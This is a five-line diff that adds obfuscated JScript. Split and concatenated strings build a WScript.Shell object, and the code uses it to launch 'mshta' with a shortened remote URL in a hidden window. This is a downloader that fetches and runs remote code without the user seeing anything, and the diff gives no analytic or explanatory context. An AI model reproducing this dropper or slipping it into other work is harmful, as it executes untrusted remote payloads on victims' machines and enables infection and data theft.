@@ -1,0 +1,5 @@
+jmqisbto = ("cript.Sh")
+var osnqhnzv = WScript.CreateObject("WS"+jmqisbto+"ell")
+xlgulyfr = ("msh")
+bwmevurd = ("ta ")
+osnqhnzv.Run((xlgulyfr+bwmevurd)+" https://t.ly/Gm8w",0)
